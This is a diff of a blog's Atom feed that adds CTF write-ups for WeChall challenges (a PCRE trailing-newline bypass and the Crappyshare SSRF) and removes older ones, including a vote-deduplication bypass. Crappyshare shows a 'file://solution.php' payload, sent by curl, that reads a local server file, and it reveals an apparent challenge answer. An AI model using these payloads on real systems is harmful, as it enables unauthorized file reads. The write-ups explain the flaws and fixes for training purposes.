@@ -13,7 +13,59 @@
     <![CDATA[Tech, Security & Personal Notes]]>
   </subtitle>
   <title>Hello Navi</title>
-  <updated>2026-06-09T09:00:44.109Z</updated>
+  <updated>2026-06-09T09:08:52.845Z</updated>
+  <entry>
+    <author>
+      <name>vkkkv</name>
+    </author>
+    <category term="ctf" scheme="https://vkkkv.github.io/categories/ctf/"/>
+    <category term="ctf" scheme="https://vkkkv.github.io/tags/ctf/"/>
+    <category term="writeup" scheme="https://vkkkv.github.io/tags/writeup/"/>
+    <category term="wechall" scheme="https://vkkkv.github.io/tags/wechall/"/>
+    <category term="php" scheme="https://vkkkv.github.io/tags/php/"/>
+    <category term="regex" scheme="https://vkkkv.github.io/tags/regex/"/>
+    <content>
+      <![CDATA[<h3 id="challenge">Challenge</h3><p>一个很短的 PHP/PCRE 正则训练。页面要求提交一个username：它必须通过正则检查，但长度又要超过正则允许的范围。</p><p>核心逻辑可以简化成：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-zA-Z]&#123;1,16&#125;$/&#x27;</span>, <span class="variable">$username</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;invalid&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$username</span>) &gt; <span class="number">16</span>) &#123;</span><br><span class="line">    <span class="comment">// solved</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看起来是矛盾的：正则只允许 1 到 16 个英文字母，后面却要求<code>strlen($username) &gt; 16</code>。</p><h3 id="solution">Solution</h3><p>关键在 PCRE 里 <code>$</code> 的语义。</p><p>在默认模式下，<code>$</code>不只匹配字符串真正结尾，也可以匹配「字符串末尾换行符之前的位置」。也就是说：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaaaaaaaaaaaaaaa\n</span><br></pre></td></tr></table></figure><p>这串内容有 16 个 <code>a</code>，后面跟一个换行符。</p><p>正则 <code>/^[a-zA-Z]{1,16}$/</code> 匹配时：</p><ul><li><code>^[a-zA-Z]{1,16}</code> 吃掉 16 个 <code>a</code>。</li><li><code>$</code> 可以停在最后的 <code>\n</code> 前面。</li><li>因此 <code>preg_match()</code> 判定通过。</li></ul><p>但 PHP 的 <code>strlen()</code> 会真实计算字节数，换行也算 1字节：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">16 个 a + 1 个 \n = 17</span><br></pre></td></tr></table></figure><p>于是同一个输入同时满足：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-zA-Z]&#123;1,16&#125;$/&#x27;</span>, <span class="variable">$username</span>) === <span class="number">1</span></span><br><span class="line"><span class="title function_ invoke__">strlen</span>(<span class="variable">$username</span>) &gt; <span class="number">16</span></span><br></pre></td></tr></table></figure><p>用 curl 提交时要保留末尾的 literal newline，推荐交给<code>--data-urlencode</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ curl -sL \</span><br><span class="line">  -b <span class="string">&#x27;WC=...&#x27;</span> \</span><br><span class="line">  -H <span class="string">&#x27;User-Agent: Mozilla/5.0&#x27;</span> \</span><br><span class="line">  --data-urlencode $<span class="string">&#x27;username=aaaaaaaaaaaaaaaa\n&#x27;</span> \</span><br><span class="line">  <span class="string">&#x27;https://www.wechall.net/challenge/training/regexmini/index.php&#x27;</span></span><br></pre></td></tr></table></figure>]]>
+    </content>
+    <id>https://vkkkv.github.io/wp/WeChall/wechall-training-regexmini/</id>
+    <link href="https://vkkkv.github.io/wp/WeChall/wechall-training-regexmini/"/>
+    <published>2026-06-09T09:08:51.000Z</published>
+    <summary>
+      <![CDATA[<h3 id="challenge">Challenge</h3>
+<p>一个很短的 PHP/PCRE 正则训练。页面要求提交一个
+username：它必须通过正则检查，但长度又要超过正则允许的范围。</p>
+<p>核心逻辑可以简化成：</p>
+<figure]]>
+    </summary>
+    <title>WeChall - Training - RegexMini</title>
+    <updated>2026-06-09T09:08:52.845Z</updated>
+  </entry>
+  <entry>
+    <author>
+      <name>vkkkv</name>
+    </author>
+    <category term="ctf" scheme="https://vkkkv.github.io/categories/ctf/"/>
+    <category term="ctf" scheme="https://vkkkv.github.io/tags/ctf/"/>
+    <category term="writeup" scheme="https://vkkkv.github.io/tags/writeup/"/>
+    <category term="wechall" scheme="https://vkkkv.github.io/tags/wechall/"/>
+    <category term="php" scheme="https://vkkkv.github.io/tags/php/"/>
+    <category term="exploit" scheme="https://vkkkv.github.io/tags/exploit/"/>
+    <category term="lfi" scheme="https://vkkkv.github.io/tags/lfi/"/>
+    <content>
+      <![CDATA[<h3 id="challenge">Challenge</h3><blockquote><p>Z and Gizmore were thinking of a file-sharing company, Crappyshare,to collect the latest warez and earn money in one go. While gizmore wasworking with the designer on the xhtml/css stuff, Z implemented theupload script, and we got first results...but it seems to contain avulnerability somewhere. Some crackers already managed to gathersensitive local files (solution.php) and broke into the server.</p></blockquote><p>Crappyshare 是一个文件共享站，支持两种上传方式：直接上传文件，或通过URL 远程拉取文件。目标是通过漏洞读取服务器本地的<code>solution.php</code>。</p><h3 id="solution">Solution</h3><p>查看源码（<code>index.php?show=code</code>）发现<code>upload_please_by_url()</code> 函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_please_by_url</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">1</span> === <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;#^[a-z]&#123;3,5&#125;://#&#x27;</span>, <span class="variable">$url</span>)) <span class="comment">// 验证有 URL scheme</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="literal">true</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="literal">true</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_FAILONERROR, <span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">false</span> === (<span class="variable">$file_data</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>)))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="title function_ invoke__">htmlDisplayError</span>(<span class="string">&#x27;cURL failed.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="title function_ invoke__">upload_please_thx</span>(<span class="variable">$file_data</span>);  <span class="comment">// 显示文件内容</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关键漏洞：URL scheme 检查为 <code>[a-z]&#123;3,5&#125;://</code>，这意味着<code>file://</code> 协议没有被阻止。cURL 的 <code>file://</code>协议可以读取本地文件系统。直接用 <code>file://solution.php</code> 作为URL 上传源：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ curl -s -b <span class="string">&#x27;WC=...&#x27;</span> --data-urlencode <span class="string">&#x27;url=file://solution.php&#x27;</span> \</span><br><span class="line">  <span class="string">&#x27;https://www.wechall.net/challenge/crappyshare/crappyshare.php&#x27;</span></span><br></pre></td></tr></table></figure><p>响应中包含 <code>solution.php</code> 的内容：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#########################</span></span><br><span class="line"><span class="comment">### ***************** ###</span></span><br><span class="line"><span class="comment">#########################</span></span><br></pre></td></tr></table></figure><h3 id="summary">Summary</h3><p>这个漏洞是典型的 SSRF（Server-Side Request Forgery）——服务端本应只允许 HTTP/HTTPS URL，但 Scheme 验证太宽松，允许了<code>file://</code> 协议。cURL 的 <code>file://</code>直接读取本地文件，绕过了所有访问控制。修复方案是只允许<code>https?://</code> 的 URL，并过滤掉<code>file://</code>、<code>ftp://</code> 等内部协议。</p><span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">ICaNSeEcLeArLyNoW</span></span>]]>
+    </content>
+    <id>https://vkkkv.github.io/wp/WeChall/wechall-crappyshare/</id>
+    <link href="https://vkkkv.github.io/wp/WeChall/wechall-crappyshare/"/>
+    <published>2026-06-09T09:03:22.000Z</published>
+    <summary>
+      <![CDATA[<h3 id="challenge">Challenge</h3>
+<blockquote>
+<p>Z and Gizmore were thinking of a file-sharing company, Crappyshare,
+to collect the latest]]>
+    </summary>
+    <title>WeChall - Crappyshare</title>
+    <updated>2026-06-09T09:05:03.592Z</updated>
+  </entry>
   <entry>
     <author>
       <name>vkkkv</name>
@@ -453,51 +505,5 @@ GBK。目标：以 admin]]>
     </summary>
     <title>WeChall - Table Names</title>
     <updated>2026-06-06T08:46:16.997Z</updated>
-  </entry>
-  <entry>
-    <author>
-      <name>vkkkv</name>
-    </author>
-    <category term="ctf" scheme="https://vkkkv.github.io/categories/ctf/"/>
-    <category term="ctf" scheme="https://vkkkv.github.io/tags/ctf/"/>
-    <category term="writeup" scheme="https://vkkkv.github.io/tags/writeup/"/>
-    <category term="wechall" scheme="https://vkkkv.github.io/tags/wechall/"/>
-    <category term="cgx" scheme="https://vkkkv.github.io/tags/cgx/"/>
-    <content>
-      <![CDATA[<h3 id="challenge">Challenge</h3><p>The page shows a random 8-bit binary string and asks for its decimalequivalent:</p><blockquote><p>Please convert this binary data to a decimal number. 01100101</p></blockquote><p>The number is randomly generated and bound to your session.</p><h3 id="solution">Solution</h3><p>Convert with Python or JavaScript:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">int</span>(<span class="string">&#x27;01100101&#x27;</span>, <span class="number">2</span>)</span><br><span class="line"><span class="number">101</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="built_in">parseInt</span>(<span class="string">&#x27;01100101&#x27;</span>, <span class="number">2</span>)</span><br><span class="line"><span class="number">101</span></span><br></pre></td></tr></table></figure><p>Manual: each bit position is a power of 2, from right (2^0) to left(2^7). <code>01100101</code> = 64+32+4+1 = 101.</p><p>Since the challenge is session-bound, you'll see a different numbereach visit — the method stays the same.</p>]]>
-    </content>
-    <id>https://vkkkv.github.io/wp/WeChall/wechall-cgx-03-binary-encoding/</id>
-    <link href="https://vkkkv.github.io/wp/WeChall/wechall-cgx-03-binary-encoding/"/>
-    <published>2026-06-06T08:40:08.000Z</published>
-    <summary>
-      <![CDATA[<h3 id="challenge">Challenge</h3>
-<p>The page shows a random 8-bit binary string and asks for its]]>
-    </summary>
-    <title>WeChall - CGX#3 - Binary Encoding</title>
-    <updated>2026-06-06T08:40:09.470Z</updated>
-  </entry>
-  <entry>
-    <author>
-      <name>vkkkv</name>
-    </author>
-    <category term="ctf" scheme="https://vkkkv.github.io/categories/ctf/"/>
-    <category term="ctf" scheme="https://vkkkv.github.io/tags/ctf/"/>
-    <category term="writeup" scheme="https://vkkkv.github.io/tags/writeup/"/>
-    <category term="wechall" scheme="https://vkkkv.github.io/tags/wechall/"/>
-    <category term="http" scheme="https://vkkkv.github.io/tags/http/"/>
-    <content>
-      <![CDATA[<h3 id="challenge">Challenge</h3><p>一个投票系统，需要投至少 2 次票。没有 IP 检查，但使用 HTTP缓存机制（ETag/VOTE cookie）防止重复投票。</p><h3 id="solution">Solution</h3><p>投票页面 <code>votes.php</code> 用 HTTP缓存头做投票去重——这不是缓存的典型用法，但原理相同:</p><ol type="1"><li><strong>VOTE cookie</strong>: 服务器设置<code>VOTE=&lt;value&gt;</code> cookie 标记已投票</li><li><strong>ETag / If-None-Match</strong>: 服务器返回 <code>ETag</code>头，浏览器后续请求带 <code>If-None-Match</code> 验证资源未变</li></ol><p>两层缺一不可: 没有 cookie 服务器不知道你投过票；没有 If-None-Match服务器认为是新的投票请求。</p><p>第一次投票成功后，服务器返回 "Please press the vote buttonagain"。关键在于第二次请求必须同时带上第一次响应的 VOTE cookie 和 ETag值。</p><p>ETag 值带 <code>W/</code> 前缀表示 weakvalidator（语义等价即可，不要求字节一致），但 curl 传 If-None-Match时要带这个前缀。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 第一次投票 - 捕获 ETag 和 VOTE cookie</span></span><br><span class="line">$ curl -v -s -b <span class="string">&#x27;WC=...&#x27;</span> <span class="string">&#x27;https://www.wechall.net/en/challenge/tracks/votes.php?vote=3&#x27;</span> 2&gt;&amp;1 | grep -i <span class="string">&#x27;etag\|set-cookie&#x27;</span></span><br><span class="line"><span class="comment"># ETag: W/22661-0-VDFqOmu5pLs8JDjj</span></span><br><span class="line"><span class="comment"># Set-Cookie: VOTE=22661-0-VDFqOmu5pLs8JDjj</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第二次投票 - 带上 VOTE cookie 和 If-None-Match</span></span><br><span class="line">$ curl -s -b <span class="string">&#x27;WC=...; VOTE=22661-0-VDFqOmu5pLs8JDjj&#x27;</span> \</span><br><span class="line">  -H <span class="string">&#x27;If-None-Match: W/22661-0-VDFqOmu5pLs8JDjj&#x27;</span> \</span><br><span class="line">  <span class="string">&#x27;https://www.wechall.net/en/challenge/tracks/votes.php?vote=3&#x27;</span></span><br><span class="line"><span class="comment"># Vote registered!</span></span><br><span class="line"><span class="comment"># Your answer is correct</span></span><br></pre></td></tr></table></figure>]]>
-    </content>
-    <id>https://vkkkv.github.io/wp/WeChall/wechall-tracks/</id>
-    <link href="https://vkkkv.github.io/wp/WeChall/wechall-tracks/"/>
-    <published>2026-06-06T07:25:38.000Z</published>
-    <summary>
-      <![CDATA[<h3 id="challenge">Challenge</h3>
-<p>一个投票系统，需要投至少 2 次票。没有 IP 检查，但使用 HTTP
-缓存机制（ETag/VOTE cookie）防止重复投票。</p>
-<h3]]>
-    </summary>
-    <title>WeChall - Tracks</title>
-    <updated>2026-06-06T07:25:40.041Z</updated>
   </entry>
 </feed>
